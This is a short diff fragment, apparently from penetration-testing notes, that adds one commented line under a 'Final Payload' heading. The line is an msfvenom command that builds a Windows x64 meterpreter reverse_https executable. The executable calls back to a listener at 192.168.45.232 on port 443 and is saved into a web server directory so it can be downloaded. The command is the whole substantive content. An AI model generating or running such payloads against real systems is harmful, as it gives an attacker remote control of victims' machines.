@@ -1,3 +1,5 @@
+# sudo msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.45.232 lport=443 -f exe -o /var/www/html/met.exe
+
 
 # Final Payload
 
